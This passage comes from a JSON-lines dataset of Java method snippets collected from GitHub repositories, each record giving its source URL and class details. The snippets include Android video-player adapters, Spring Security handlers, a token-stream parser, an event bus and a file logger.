convertView.findViewById(R.id.video_item_player);            convertView.setTag(holder);        } else {            holder = (ViewHolder) convertView.getTag();        }        final String url = \"http://9890.vod.myqcloud.com/9890_4e292f9a3dd011e6b4078980237cc3d3.f20.mp4\";        //\u591a\u4e2a\u64ad\u653e\u65f6\u5fc5\u987b\u5728setUpLazy\u3001setUp\u548cgetGSYVideoManager()\u7b49\u524d\u9762\u8bbe\u7f6e        holder.gsyVideoPlayer.setPlayTag(TAG);        holder.gsyVideoPlayer.setPlayPosition(position);        boolean isPlaying = holder.gsyVideoPlayer.getCurrentPlayer().isInPlayingState();        if (!isPlaying) {            holder.gsyVideoPlayer.setUpLazy(url, false, null, null, \"\u8fd9\u662ftitle\");        }        //\u589e\u52a0title        holder.gsyVideoPlayer.getTitleTextView().setVisibility(View.GONE);        //\u8bbe\u7f6e\u8fd4\u56de\u952e        holder.gsyVideoPlayer.getBackButton().setVisibility(View.GONE);        //\u8bbe\u7f6e\u5168\u5c4f\u6309\u952e\u529f\u80fd        holder.gsyVideoPlayer.getFullscreenButton().setOnClickListener(new View.OnClickListener() {            @Override            public void onClick(View v) {                resolveFullBtn(holder.gsyVideoPlayer);            }        });        holder.gsyVideoPlayer.setRotateViewAuto(true);        holder.gsyVideoPlayer.setLockLand(true);        holder.gsyVideoPlayer.setReleaseWhenLossAudio(false);        holder.gsyVideoPlayer.setShowFullAnimation(true);        holder.gsyVideoPlayer.setIsTouchWiget(false);        holder.gsyVideoPlayer.setNeedLockFull(true);        if (position % 2 == 0) {            holder.gsyVideoPlayer.loadCoverImage(url, R.mipmap.xxx1);        } else {            holder.gsyVideoPlayer.loadCoverImage(url, R.mipmap.xxx2);        }        holder.gsyVideoPlayer.setVideoAllCallBack(new GSYSampleCallBack() {            @Override            public void onQuitFullscreen(String url, Object... objects) {                super.onQuitFullscreen(url, objects);                fullKey = \"null\";            }            @Override            public void onEnterFullscreen(String url, Object... objects) {                super.onEnterFullscreen(url, objects);                holder.gsyVideoPlayer.getCurrentPlayer().getTitleTextView().setText((String) objects[0]);                fullKey = holder.gsyVideoPlayer.getKey();            }            @Override            public void onAutoComplete(String url, Object... objects) {                super.onAutoComplete(url, objects);            }        });        return convertView;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/adapter/ListMultiNormalAdapter.java", "stars": "2", "class": {"name": "ListMultiNormalAdapter", "extends": "BaseAdapter", "implements": null, "modifiers": ["public"]}}, {"method_name": "resolveFullBtn", "params": ["StandardGSYVideoPlayer"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void resolveFullBtn(final StandardGSYVideoPlayer standardGSYVideoPlayer) {        standardGSYVideoPlayer.startWindowFullscreen(context, false, true);    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/adapter/ListMultiNormalAdapter.java", "stars": "2", "class": {"name": "ListMultiNormalAdapter", "extends": "BaseAdapter", "implements": null, "modifiers": ["public"]}}, {"method_name": "getFullKey", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getFullKey() {        return fullKey;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/adapter/ListMultiNormalAdapter.java", "stars": "2", "class": {"name": "ListMultiNormalAdapter", "extends": "BaseAdapter", "implements": null, "modifiers": ["public"]}}, {"method_name": "handle", "params": ["HttpServletRequest", "HttpServletResponse", "AccessDeniedException"], "throws": ["IOException", "ServletException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void handle(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, AccessDeniedException e) throws IOException, ServletException {        httpServletResponse.setCharacterEncoding(\"UTF-8\");//\u8bbe\u7f6e\u670d\u52a1\u5668\u7684\u7f16\u7801\uff0c\u9ed8\u8ba4\u662fISO-8859-1        httpServletResponse.setContentType(\"application/json; charset = utf-8\");//\u544a\u8bc9\u6d4f\u89c8\u5668\u670d\u52a1\u5668\u7684\u7f16\u7801\u683c\u5f0f        httpServletResponse.getWriter().write(new Gson().toJson(ApiResponse.ofStatus(ApiResponseEnum.NO_PRIORITY_ERROR)));    }", "url": "https://raw.githubusercontent.com/harry-xqb/rent-house/master/src/main/java/com/harry/renthouse/security/ajax_login/AjaxAccessDeniedHandler.java", "stars": "3", "class": {"name": "AjaxAccessDeniedHandler", "extends": null, "implements": ["AccessDeniedHandler"], "modifiers": ["public"]}}, {"method_name": "gracefulShutdown", "params": ["ExecutorService", "Duration"], "throws": ["InterruptedException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void gracefulShutdown(final ExecutorService service, final Duration timeout)      throws InterruptedException {    service.shutdown(); // Disable new tasks from being submitted    final long timeout_in_unit_of_miliseconds = timeout.toMillis();    // Wait a while for existing tasks to terminate    if (!service.awaitTermination(timeout_in_unit_of_miliseconds, MILLI_SECONDS_TIME_UNIT)) {      service.shutdownNow(); // Cancel currently executing tasks      // Wait a while for tasks to respond to being cancelled      if (!service.awaitTermination(timeout_in_unit_of_miliseconds, MILLI_SECONDS_TIME_UNIT)) {        logger.error(\"The executor service did not terminate.\");      }    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/az-core/src/main/java/azkaban/utils/ExecutorServiceUtils.java", "stars": "18", "class": {"name": "ExecutorServiceUtils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getColor", "params": ["ItemStack"], "throws": null, "modifiers": ["public", "static"], "return_type": "Vec3d", "snippet": "    public static Vec3d getColor(ItemStack stack) {        NBTTagCompound tag = stack.getTagCompound();        if (tag != null) {            NBTTagCompound color = tag.getCompoundTag(TAG_COLOR);            return new Vec3d(                    NBTHelper.getOrDefault(color, \"h\", 1f),                    NBTHelper.getOrDefault(color, \"s\", 1f),                    NBTHelper.getOrDefault(color, \"b\", 1f)            );        }        return new Vec3d(1f, 1f, 1f);    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/Item/ItemColorPicker/ItemColorPicker.java", "stars": "2", "class": {"name": "ItemColorPicker", "extends": "PhaseItemBase", "implements": null, "modifiers": ["public"]}}, {"method_name": "setColor", "params": ["ItemStack", "float", "float", "float"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void setColor(ItemStack stack, float h, float s, float b) {        NBTTagCompound tag = new NBTTagCompound();        tag.setFloat(\"h\", h);        tag.setFloat(\"s\", s);        tag.setFloat(\"b\", b);        if (stack.getTagCompound() == null)            stack.setTagCompound(new NBTTagCompound());        NBTTagCompound stackTag = stack.getTagCompound();        stackTag.setTag(TAG_COLOR, tag);    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/Item/ItemColorPicker/ItemColorPicker.java", "stars": "2", "class": {"name": "ItemColorPicker", "extends": "PhaseItemBase", "implements": null, "modifiers": ["public"]}}, {"method_name": "onItemRightClick", "params": ["World", "EntityPlayer", "EnumHand"], "throws": null, "modifiers": ["public"], "return_type": "ActionResult<ItemStack>", "snippet": "    public ActionResult<ItemStack> onItemRightClick(World worldIn, EntityPlayer playerIn, EnumHand handIn) {        playerIn.openGui(Phase.inst, GUILib.GUI_PICKER, worldIn, handIn == EnumHand.OFF_HAND ? 1 : 0, 0, 0);        return super.onItemRightClick(worldIn, playerIn, handIn);    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/Item/ItemColorPicker/ItemColorPicker.java", "stars": "2", "class": {"name": "ItemColorPicker", "extends": "PhaseItemBase", "implements": null, "modifiers": ["public"]}}, {"method_name": "hasMore", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean hasMore () {\t\treturn index < end;\t}", "url": "https://raw.githubusercontent.com/javamxd/ssssssss/master/src/main/java/org/ssssssss/expression/parsing/TokenStream.java", "stars": "13", "class": {"name": "TokenStream", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "hasNext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean hasNext(){\t\treturn index + 1 < end;\t}", "url": "https://raw.githubusercontent.com/javamxd/ssssssss/master/src/main/java/org/ssssssss/expression/parsing/TokenStream.java", "stars": "13", "class": {"name": "TokenStream", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "hasPrev", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean hasPrev(){\t\treturn index > 0;\t}", "url": "https://raw.githubusercontent.com/javamxd/ssssssss/master/src/main/java/org/ssssssss/expression/parsing/TokenStream.java", "stars": "13", "class": {"name": "TokenStream", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "consume", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Token", "snippet": "\tpublic Token consume () {\t\tif (!hasMore()) {            throw new RuntimeException(\"Reached the end of the source.\");        }\t\treturn tokens.get(index++);\t}", "url": "https://raw.githubusercontent.com/javamxd/ssssssss/master/src/main/java/org/ssssssss/expression/parsing/TokenStream.java", "stars": "13", "class": {"name": "TokenStream", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "next", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Token", "snippet": "\tpublic Token next(){\t\tif (!hasMore()) {            throw new RuntimeException(\"Reached the end of the source.\");        }\t\treturn tokens.get(++index);\t}", "url": "https://raw.githubusercontent.com/javamxd/ssssssss/master/src/main/java/org/ssssssss/expression/parsing/TokenStream.java", "stars": "13", "class": {"name": "TokenStream", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "prev", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Token", "snippet": "\tpublic Token prev(){\t\tif(index == 0){\t\t\tthrow new RuntimeException(\"Reached the end of the source.\");\t\t}\t\treturn tokens.get(--index);\t}", "url": "https://raw.githubusercontent.com/javamxd/ssssssss/master/src/main/java/org/ssssssss/expression/parsing/TokenStream.java", "stars": "13", "class": {"name": "TokenStream", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "expect", "params": ["TokenType"], "throws": null, "modifiers": ["public"], "return_type": "Token", "snippet": "\tpublic Token expect (TokenType type) {\t\tboolean result = match(type, true);\t\tif (!result) {\t\t\tToken token = index < tokens.size() ? tokens.get(index) : null;\t\t\tSpan span = token != null ? token.getSpan() : null;\t\t\tif (span == null) {                ExpressionError.error(\"Expected '\" + type.getError() + \"', but reached the end of the source.\", this);            } else {                ExpressionError.error(\"Expected '\" + type.getError() + \"', but got '\" + token.getText() + \"'\", span);            }\t\t\treturn null; // never reached\t\t} else {\t\t\treturn tokens.get(index - 1);\t\t}\t}", "url": "https://raw.githubusercontent.com/javamxd/ssssssss/master/src/main/java/org/ssssssss/expression/parsing/TokenStream.java", "stars": "13", "class": {"name": "TokenStream", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "expect", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Token", "snippet": "\tpublic Token expect (String text) {\t\tboolean result = match(text, true);\t\tif (!result) {\t\t\tToken token = index < tokens.size() ? tokens.get(index) : null;\t\t\tSpan span = token != null ? token.getSpan() : null;\t\t\tif (span == null) {                ExpressionError.error(\"Expected '\" + text + \"', but reached the end of the source.\", this);            } else {                ExpressionError.error(\"Expected '\" + text + \"', but got '\" + token.getText() + \"'\", span);            }\t\t\treturn null; // never reached\t\t} else {\t\t\treturn tokens.get(index - 1);\t\t}\t}", "url": "https://raw.githubusercontent.com/javamxd/ssssssss/master/src/main/java/org/ssssssss/expression/parsing/TokenStream.java", "stars": "13", "class": {"name": "TokenStream", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "match", "params": ["TokenType", "boolean"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean match (TokenType type, boolean consume) {\t\tif (index >= end) {            return false;        }\t\tif (tokens.get(index).getType() == type) {\t\t\tif (consume) {                index++;            }\t\t\treturn true;\t\t}\t\treturn false;\t}", "url": "https://raw.githubusercontent.com/javamxd/ssssssss/master/src/main/java/org/ssssssss/expression/parsing/TokenStream.java", "stars": "13", "class": {"name": "TokenStream", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "match", "params": ["String", "boolean"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean match (String text, boolean consume) {\t\tif (index >= end) {            return false;        }\t\tif (tokens.get(index).getText().equals(text)) {\t\t\tif (consume) {                index++;            }\t\t\treturn true;\t\t}\t\treturn false;\t}", "url": "https://raw.githubusercontent.com/javamxd/ssssssss/master/src/main/java/org/ssssssss/expression/parsing/TokenStream.java", "stars": "13", "class": {"name": "TokenStream", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "match", "params": ["boolean", "TokenType"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean match (boolean consume, TokenType... types) {\t\tfor (TokenType type : types) {\t\t\tif (match(type, consume)) {                return true;            }\t\t}\t\treturn false;\t}", "url": "https://raw.githubusercontent.com/javamxd/ssssssss/master/src/main/java/org/ssssssss/expression/parsing/TokenStream.java", "stars": "13", "class": {"name": "TokenStream", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "match", "params": ["boolean", "String"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean match (boolean consume, String... tokenTexts) {\t\tfor (String text : tokenTexts) {\t\t\tif (match(text, consume)) {                return true;            }\t\t}\t\treturn false;\t}", "url": "https://raw.githubusercontent.com/javamxd/ssssssss/master/src/main/java/org/ssssssss/expression/parsing/TokenStream.java", "stars": "13", "class": {"name": "TokenStream", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getSource", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getSource () {\t\tif (tokens.size() == 0) {            return null;        }\t\treturn tokens.get(0).getSpan().getSource();\t}", "url": "https://raw.githubusercontent.com/javamxd/ssssssss/master/src/main/java/org/ssssssss/expression/parsing/TokenStream.java", "stars": "13", "class": {"name": "TokenStream", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "obtainPendingPost", "params": ["Subscription", "Object"], "throws": null, "modifiers": ["static"], "return_type": "PendingPost", "snippet": "    static PendingPost obtainPendingPost(Subscription subscription, Object event) {        synchronized (pendingPostPool) {            int size = pendingPostPool.size();            if (size > 0) {                PendingPost pendingPost = pendingPostPool.remove(size - 1);                pendingPost.event = event;                pendingPost.subscription = subscription;                pendingPost.next = null;                return pendingPost;            }        }        return new PendingPost(event, subscription);    }", "url": "https://raw.githubusercontent.com/chenjk-520/keventbus/master/keventbus/src/main/java/com/util/keventbus/PendingPost.java", "stars": "7", "class": {"name": "PendingPost", "extends": null, "implements": null, "modifiers": ["final"]}}, {"method_name": "releasePendingPost", "params": ["PendingPost"], "throws": null, "modifiers": ["static"], "return_type": "void", "snippet": "    static void releasePendingPost(PendingPost pendingPost) {        pendingPost.event = null;        pendingPost.subscription = null;        pendingPost.next = null;        synchronized (pendingPostPool) {            // Don't let the pool grow indefinitely            if (pendingPostPool.size() < 10000) {                pendingPostPool.add(pendingPost);            }        }    }", "url": "https://raw.githubusercontent.com/chenjk-520/keventbus/master/keventbus/src/main/java/com/util/keventbus/PendingPost.java", "stars": "7", "class": {"name": "PendingPost", "extends": null, "implements": null, "modifiers": ["final"]}}, {"method_name": "write", "params": ["long"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void write(long x) {\t\t// TODO Auto-generated method stub\t\tprintWriter.print(x);\t\t\t}", "url": "https://raw.githubusercontent.com/miricel/CO_Project/master/UPTBench/src/logging/FileLogger.java", "stars": "2", "class": {"name": "FileLogger", "extends": null, "implements": ["ILogger"], "modifiers": ["public"]}}, {"method_name": "write", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void write(String s) {\t\t// TODO Auto-generated method stub\t\tprintWriter.print(s);\t}", "url": "https://raw.githubusercontent.com/miricel/CO_Project/master/UPTBench/src/logging/FileLogger.java", "stars": "2", "class": {"name": "FileLogger", "extends": null, "implements": ["ILogger"], "modifiers": ["public"]}}, {"method_name": "write", "params": ["Object"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void write(Object... params) {\t\t// TODO Auto-generated method stub\t\tfor(Object o: params) \t\t\tif(o instanceof String)\t\t\t\twrite((String)o + \" \");\t\t\telse\t\t\t\twrite((long)o);\t}", "url": "https://raw.githubusercontent.com/miricel/CO_Project/master/UPTBench/src/logging/FileLogger.java", "stars": "2", "class": {"name": "FileLogger", "extends": null, "implements": ["ILogger"], "modifiers": ["public"]}}, {"method_name": "close", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void close() {\t\t// TODO Auto-generated method stub\t\tprintWriter.close();\t\t\t}", "url": "https://raw.githubusercontent.com/miricel/CO_Project/master/UPTBench/src/logging/FileLogger.java", "stars": "2", "class": {"name": "FileLogger", "extends": null, "implements": ["ILogger"], "modifiers": ["public"]}}, {"method_name": "convert", "params": ["long", "TimeUnit"], "throws": null, "modifiers": ["public"], "return_type": "double", "snippet": "\tpublic double convert(long value, TimeUnit unit) {\t\tdouble val = 0.0;\t\t\t\tswitch(unit) {\t      case Nano:\t    \t  val = value;\t    \t  break;\t      case Micro:\t    \t  val = value / 1000.0;\t    \t  break;\t      case Milli:\t    \t  val = value / 1000000.0;\t    \t  break;\t      case Sec:\t    \t  val = value / 1000000000.0 ;\t    \t  break;\t\t}\t\t\t\treturn val;\t}", "url": "https://raw.githubusercontent.com/miricel/CO_Project/master/UPTBench/src/logging/FileLogger.java", "stars": "2", "class": {"name": "FileLogger", "extends": null, "implements": ["ILogger"], "modifiers": ["public"]}}, {"method_name": "writeTime", "params": ["long", "TimeUnit"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void writeTime(long value, TimeUnit unit) {\t\t// TODO Auto-generated method stub\t\tprintWriter.print(convert(value,unit));\t\tprintWriter.print(\" \");\t\tprintWriter.print(unit);\t\tprintWriter.print(\"\\n\");\t\t\t}", "url": "https://raw.githubusercontent.com/miricel/CO_Project/master/UPTBench/src/logging/FileLogger.java", "stars": "2", "class": {"name": "FileLogger", "extends": null, "implements": ["ILogger"], "modifiers": ["public"]}}, {"method_name": "writeTime", "params": ["String", "long", "TimeUnit"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void writeTime(String string, long value, TimeUnit unit) {\t\t// TODO Auto-generated method stub\t\t\t\tprintWriter.print(string+\" \");\t\tprintWriter.print(convert(value,unit));\t\tprintWriter.print(\" \");\t\tprintWriter.print(unit);\t\tprintWriter.print(\"\\n\");\t\t\t}", "url": "https://raw.githubusercontent.com/miricel/CO_Project/master/UPTBench/src/logging/FileLogger.java", "stars": "2", "class": {"name": "FileLogger", "extends": null, "implements": ["ILogger"], "modifiers": ["public"]}}, {"method_name": "main", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {        /*int a = 10;        int b = 20;        int sum = a + b;        System.out.println(sum);*/        /*for (int i = 0; i <3 ; i++) {            System.out.println(i);        }*/        print();    }", "url": "https://raw.githubusercontent.com/liuminchao123/JavaWeb_Learning/master/02.%20java/Java/%E9%BB%91%E9%A9%AC%E6%95%99%E7%A8%8B/15.%E3%80%90Map%E3%80%91-%E7%AC%94%E8%AE%B0/code/04_Map/src/com/itheima/demo05/Debug/Demo01Debug.java", "stars": "2", "class": {"name": "Demo01Debug", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "print", "params": [], "throws": null, "modifiers": ["private", "static"], "return_type": "void", "snippet": "    private static void print() {        System.out.println(\"HelloWorld\");        System.out.println(\"HelloWorld\");        System.out.println(\"HelloWorld\");        System.out.println(\"HelloWorld\");        System.out.println(\"HelloWorld\");    }", "url": "https://raw.githubusercontent.com/liuminchao123/JavaWeb_Learning/master/02.%20java/Java/%E9%BB%91%E9%A9%AC%E6%95%99%E7%A8%8B/15.%E3%80%90Map%E3%80%91-%E7%AC%94%E8%AE%B0/code/04_Map/src/com/itheima/demo05/Debug/Demo01Debug.java", "stars": "2", "class": {"name": "Demo01Debug", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getRestTemplate", "params": [], "throws": null, "modifiers": ["public"], "return_type": "RestTemplate", "snippet": "    public RestTemplate getRestTemplate()    {        return new RestTemplate();    }", "url": "https://raw.githubusercontent.com/iMine141/springcloud-test/master/cloud-consumer-order80/src/main/java/com/atguigu/springcloud/config/ApplicationContextConfig.java", "stars": "1", "class": {"name": "ApplicationContextConfig", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "onFitSystemWindows", "params": ["android"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onFitSystemWindows (android.graphics.Rect p0)\t{\t\tn_onFitSystemWindows (p0);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/mono/android/support/v7/widget/FitWindowsViewGroup_OnFitSystemWindowsListenerImplementor.java", "stars": "2", "class": {"name": "FitWindowsViewGroup_OnFitSystemWindowsListenerImplementor", "extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"method_name": "n_onFitSystemWindows", "params": ["android"], "throws": null, "modifiers": ["native", "private"], "return_type": "void", "snippet": "\tprivate native void n_onFitSystemWindows (android.graphics.Rect p0);\tprivate java.util.ArrayList refList;\tpublic void monodroidAddReference (java.lang.Object obj)\t{\t\tif (refList == null)\t\t\trefList = new java.util.ArrayList ();\t\trefList.add (obj);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/mono/android/support/v7/widget/FitWindowsViewGroup_OnFitSystemWindowsListenerImplementor.java", "stars": "2", "class": {"name": "FitWindowsViewGroup_OnFitSystemWindowsListenerImplementor", "extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"method_name": "monodroidAddReference", "params": ["java"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidAddReference (java.lang.Object obj)\t{\t\tif (refList == null)\t\t\trefList = new java.util.ArrayList ();\t\trefList.add (obj);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/mono/android/support/v7/widget/FitWindowsViewGroup_OnFitSystemWindowsListenerImplementor.java", "stars": "2", "class": {"name": "FitWindowsViewGroup_OnFitSystemWindowsListenerImplementor", "extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"method_name": "monodroidClearReferences", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidClearReferences ()\t{\t\tif (refList != null)\t\t\trefList.clear ();\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/mono/android/support/v7/widget/FitWindowsViewGroup_OnFitSystemWindowsListenerImplementor.java", "stars": "2", "class": {"name": "FitWindowsViewGroup_OnFitSystemWindowsListenerImplementor", "extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"method_name": "getAuthorities", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Collection<GrantedAuthority>", "snippet": "    public Collection<? extends GrantedAuthority> getAuthorities() {        //\u8fd4\u56de\u5f53\u524d\u7528\u6237\u7684\u6743\u9650        return permissionList.stream()                .filter(permission -> permission.getValue()!=null)                .map(permission ->new SimpleGrantedAuthority(permission.getValue()))                .collect(Collectors.toList());    }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/security-jwt/src/main/java/com/yyj/security/dto/AdminUserDetails.java", "stars": "2", "class": {"name": "AdminUserDetails", "extends": null, "implements": ["UserDetails"], "modifiers": ["public"]}}, {"method_name": "getPassword", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getPassword() {        return umsAdmin.getPassword();    }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/security-jwt/src/main/java/com/yyj/security/dto/AdminUserDetails.java", "stars": "2", "class": {"name": "AdminUserDetails", "extends": null, "implements": ["UserDetails"], "modifiers": ["public"]}}, {"method_name": "getUsername", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getUsername() {        return umsAdmin.getUsername();    }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/security-jwt/src/main/java/com/yyj/security/dto/AdminUserDetails.java", "stars": "2", "class": {"name": "AdminUserDetails", "extends": null, "implements": ["UserDetails"], "modifiers": ["public"]}}, {"method_name": "isAccountNonExpired", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isAccountNonExpired() {        return true;    }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/security-jwt/src/main/java/com/yyj/security/dto/AdminUserDetails.java", "stars": "2", "class": {"name": "AdminUserDetails", "extends": null, "implements": ["UserDetails"], "modifiers": ["public"]}}, {"method_name": "isAccountNonLocked", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isAccountNonLocked() {        return true;    }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/security-jwt/src/main/java/com/yyj/security/dto/AdminUserDetails.java", "stars": "2", "class": {"name": "AdminUserDetails", "extends": null, "implements": ["UserDetails"], "modifiers": ["public"]}}, {"method_name": "isCredentialsNonExpired", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isCredentialsNonExpired() {        return true;    }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/security-jwt/src/main/java/com/yyj/security/dto/AdminUserDetails.java", "stars": "2", "class": {"name": "AdminUserDetails", "extends": null, "implements": ["UserDetails"], "modifiers": ["public"]}}, {"method_name": "isEnabled", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isEnabled() {        return umsAdmin.getStatus().equals(1);    }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/security-jwt/src/main/java/com/yyj/security/dto/AdminUserDetails.java", "stars": "2", "class": {"name": "AdminUserDetails", "extends": null, "implements": ["UserDetails"], "modifiers": ["public"]}}, {"method_name": "newInstance", "params": ["String", "String", "int", "SelectionListener"], "throws": null, "modifiers": ["public", "static"], "return_type": "TVPreferencesListFragment", "snippet": "    public static TVPreferencesListFragment newInstance(@NonNull String title, @NonNull String[] items, int currentPos, @NonNull SelectionListener listener) {        Bundle args = new Bundle();        args.putString(TITLE_ARG, title);        args.putStringArray(ITEMS_ARG, items);        args.putInt(CURRENT_POS, currentPos);        TVPreferencesListFragment fragment = new TVPreferencesListFragment();        fragment.setArguments(args);        fragment.mListener = listener;        return fragment;    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/tv/src/main/java/butter/droid/tv/fragments/TVPreferencesListFragment.java", "stars": "4", "class": {"name": "TVPreferencesListFragment", "extends": "GuidedStepFragment", "implements": null, "modifiers": ["public"]}}, {"method_name": "onViewCreated", "params": ["View", "Bundle"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onViewCreated(View view, Bundle savedInstanceState) {        super.onViewCreated(view, savedInstanceState);        setSelectedActionPosition(getArguments().getInt(CURRENT_POS, 0));    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/tv/src/main/java/butter/droid/tv/fragments/TVPreferencesListFragment.java", "stars": "4", "class": {"name": "TVPreferencesListFragment", "extends": "GuidedStepFragment", "implements": null, "modifiers": ["public"]}}, {"method_name": "onCreateGuidance", "params": ["Bundle"], "throws": null, "modifiers": ["public"], "return_type": "GuidanceStylist", "snippet": "    public GuidanceStylist.Guidance onCreateGuidance(Bundle savedInstanceState) {        return new GuidanceStylist.Guidance(getArguments().getString(TITLE_ARG, \"\").toUpperCase(LocaleUtils.getCurrent()), null, getString(R.string.app_name), null);    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/tv/src/main/java/butter/droid/tv/fragments/TVPreferencesListFragment.java", "stars": "4", "class": {"name": "TVPreferencesListFragment", "extends": "GuidedStepFragment", "implements": null, "modifiers": ["public"]}}, {"method_name": "onCreateActions", "params": ["List<GuidedAction>", "Bundle"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onCreateActions(@NonNull List<GuidedAction> actions, Bundle savedInstanceState) {        String[] items = getArguments().getStringArray(ITEMS_ARG);        int current = getArguments().getInt(CURRENT_POS, -1);        int i = 0;        if (items != null) {            for(String item : items) {                actions.add(                    new GuidedAction.Builder()                            .id(i)                            .checked(i == current)                            .title(item)                            .build()                );                i++;            }        }        super.onCreateActions(actions, savedInstanceState);    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/tv/src/main/java/butter/droid/tv/fragments/TVPreferencesListFragment.java", "stars": "4", "class": {"name": "TVPreferencesListFragment", "extends": "GuidedStepFragment", "implements": null, "modifiers": ["public"]}}, {"method_name": "onGuidedActionClicked", "params": ["GuidedAction"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onGuidedActionClicked(GuidedAction action) {        super.onGuidedActionClicked(action);        mListener.onSelect((int) action.getId());        getFragmentManager().popBackStack();    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/tv/src/main/java/butter/droid/tv/fragments/TVPreferencesListFragment.java", "stars": "4", "class": {"name": "TVPreferencesListFragment", "extends": "GuidedStepFragment", "implements": null, "modifiers": ["public"]}}, {"method_name": "main", "params": ["String"], "throws": null, "modifiers": ["public", "static"], 